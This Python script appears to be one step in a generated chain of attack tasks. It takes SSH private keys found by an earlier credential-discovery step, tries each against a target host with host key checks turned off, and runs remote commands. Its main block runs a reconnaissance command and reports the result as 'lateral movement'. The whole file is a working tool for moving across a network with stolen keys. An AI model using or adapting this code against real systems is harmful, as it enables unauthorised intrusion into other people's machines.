from data.code_scripts_PAST.level2_cred_disc_lat_mov_HAIKU_query.TASK_001_ssh_credential_discovery import SshCredentials
import paramiko


def execute_remote_ssh_command(target_host: str, username: str, command: str, ssh_credentials: SshCredentials) -> dict[str, str]:
    """Attempt to connect to a target host via SSH using discovered private keys and execute a remote command.

    Iterates through the provided private key paths, attempting authentication with each one until
    successful connection is established. Upon success, executes the specified command on the remote
    host and captures stdout/stderr output.

    Args:
        target_host: The hostname or IP address of the SSH target (e.g., '192.168.1.100').
        username: The SSH username to authenticate as.
        command: The shell command to execute on the remote host.
        ssh_credentials: SshCredentials object containing private_key_paths and known_hosts from TASK_001.

    Returns:
        A dictionary with keys 'stdout', 'stderr', and 'success' indicating the result of the operation.

    Raises:
        paramiko.AuthenticationException: If authentication fails for all provided keys.
        paramiko.SSHException: For general SSH connection errors.
        FileNotFoundError: If a private key file path is not found on disk.
    """
    results = {
        'stdout': '',
        'stderr': '',
        'success': False,
        'host': target_host,
        'username': username,
        'command': command
    }

    for key_path in ssh_credentials.private_key_paths:
        try:
            # Ensure the private key file exists and is readable
            if not os.path.exists(key_path):
                results['stderr'] += f"Key file not found: {key_path}\n"
                continue

            # Set proper permissions on the key file (chmod 600) to satisfy SSH client requirements
            os.chmod(key_path, 0o600)

            # Create SSH client with AutoAddPolicy to avoid interactive host key prompts
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                # Connect non-interactively using the private key
                ssh_client.connect(
                    hostname=target_host,
                    username=username,
                    key_filename=key_path,
                    timeout=10,
                    banner_timeout=5
                )

                # Execute the remote command and capture output
                stdin, stdout, stderr = ssh_client.exec_command(command)
                stdout_output = stdout.read().decode('utf-8', errors='replace')
                stderr_output = stderr.read().decode('utf-8', errors='replace')

                results['stdout'] += f"[{target_host}:{username}] {command}\n" + stdout_output
                results['stderr'] += f"[{target_host}:{username}] {command}\n" + stderr_output
                results['success'] = True
                break  # Stop after first successful authentication

            except paramiko.AuthenticationException:
                results['stderr'] += f"[{target_host}:{username}] Authentication failed with key: {key_path}\n"
            except paramiko.SSHException as e:
                results['stderr'] += f"[{target_host}:{username}] SSH connection error ({key_path}): {e}\n"
            finally:
                ssh_client.close()

        except FileNotFoundError as e:
            results['stderr'] += f"[{target_host}:{username}] Key file not found: {key_path} - {e}\n"
        except Exception as e:
            results['stderr'] += f"[{target_host}:{username}] Unexpected error with key {key_path}: {type(e).__name__}: {e}\n"

    return results


if __name__ == '__main__':
    import os
    from data.code_scripts_PAST.level2_cred_disc_lat_mov_HAIKU_query.TASK_001_ssh_credential_discovery import SshCredentials, discover_ssh_credentials

    # Discover credentials (simulating upstream TASK_001 output)
    ssh_creds = discover_ssh_credentials()

    if not ssh_creds.private_key_paths:
        print("No private keys discovered. Exiting.")
        exit(1)

    target_host = '192.168.1.100'
    username = 'ubuntu'
    command = "whoami && hostname && cat /etc/os-release"

    results = execute_remote_ssh_command(target_host, username, command, ssh_creds)

    print(f"\n{'='*60}")
    print("SSH LATERAL MOVEMENT EXECUTION RESULTS")
    print(f"{'='*60}")
    print(f"Target: {results['host']}")
    print(f"Username: {results['username']}")
    print(f"Command: {results['command']}")
    print(f"Success: {results['success']}")
    print(f"\n--- STDOUT ---\n{results['stdout']}")
    if results['stderr']:
        print(f"\n--- STDERR ---\n{results['stderr']}")
